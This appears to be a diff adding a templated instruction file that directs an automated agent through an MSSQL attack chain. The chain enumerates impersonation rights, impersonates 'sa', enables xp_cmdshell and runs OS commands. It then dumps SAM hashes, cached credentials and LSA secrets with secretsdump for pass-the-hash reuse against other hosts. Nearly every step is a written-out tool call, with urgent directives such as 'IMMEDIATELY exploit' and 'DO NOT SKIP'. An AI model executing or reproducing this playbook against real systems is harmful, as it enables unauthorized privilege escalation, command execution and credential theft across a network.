@@ -1,0 +1,68 @@
+**MSSQL IMPERSONATION ENUMERATION**
+
+Target: {{ target }}
+Username: {{ domain }}\{{ username }}
+Password: {{ password }}
+Task ID: {{ task_id }}
+
+**OBJECTIVE:** Discover if sa/sysadmin impersonation is possible.
+
+**STEP 1: Run impersonation enumeration**
+```
+mssql_enum_impersonation(
+    target='{{ target }}',
+    username='{{ username }}',
+    password='{{ password }}',
+    domain='{{ domain }}',
+    windows_auth=True
+)
+```
+
+**STEP 2: If sa/sysadmin found, IMMEDIATELY exploit:**
+```
+mssql_impersonate(
+    target='{{ target }}',
+    username='{{ username }}',
+    password='{{ password }}',
+    impersonate_user='sa',
+    query='SELECT SYSTEM_USER; EXEC sp_configure "xp_cmdshell", 1; RECONFIGURE;',
+    domain='{{ domain }}',
+    windows_auth=True
+)
+```
+
+**STEP 3: Enable xp_cmdshell**
+```
+mssql_enable_xp_cmdshell(
+    target='{{ target }}',
+    username='{{ username }}',
+    password='{{ password }}',
+    domain='{{ domain }}'
+)
+```
+
+**STEP 4: Verify OS command execution**
+```
+mssql_command(
+    target='{{ target }}',
+    username='{{ username }}',
+    password='{{ password }}',
+    command='whoami /priv',
+    domain='{{ domain }}'
+)
+```
+
+**STEP 5: DUMP CREDENTIALS (CRITICAL - DO NOT SKIP!)**
+Use secretsdump to extract local hashes from this host:
+```
+secretsdump(
+    target='{{ target }}',
+    username='{{ username }}',
+    password='{{ password }}',
+    domain='{{ domain }}'
+)
+```
+→ This extracts SAM hashes, cached creds, and LSA secrets.
+→ Local admin hashes can be reused via PTH against other hosts!
+
+Credentials and hashes are automatically extracted from tool output — do NOT fabricate or restate them in JSON.
